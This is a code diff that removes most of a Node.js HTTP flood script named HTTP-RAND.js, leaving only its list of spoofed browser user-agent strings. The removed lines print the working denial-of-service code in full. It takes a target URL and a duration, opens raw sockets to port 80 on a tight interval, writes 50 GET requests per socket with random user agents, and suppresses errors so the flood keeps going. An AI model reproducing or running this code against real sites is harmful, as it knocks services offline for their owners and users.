@@ -1,24 +1,4 @@
-const fs = require('fs');
-const url = require('url');
-const net = require('net');
-if (process.argv.length <= 2) {
-	console.log("node HTTP-RAND.js url time");
-	console.log("Edit by emp001");
-	process.exit(-1);
-}
-var target = process.argv[2];
-var parsed = url.parse(target);
-var host = url.parse(target).host;
-var time = process.argv[3];
 
-process.on('uncaughtException', function (e) {
-    console.warn(e);
-});
-
-process.on('unhandledRejection', function (e) {
-    console.warn(e);
-});
-const UAs = [
 	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
 	"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
 	"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
@@ -4559,19 +4539,3 @@ const UAs = [
 	"Wget/1.9.1",
 	"Wget/1.9 cvs-stable (Red Hat modified)",
 	"wii libnup/1.0"
-];
-var int = setInterval(() => {
-    var s = require('net').Socket();
-    s.connect(80, host);
-    s.setTimeout(10000);
-    for (var i = 0; i < 50; i++) {
-        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
-    }
-    s.on('data', function () {
-        setTimeout(function () {
-            s.destroy();
-            return delete s;
-        }, 5000);
-    })
-});
-setTimeout(() => clearInterval(int), time * 1000);
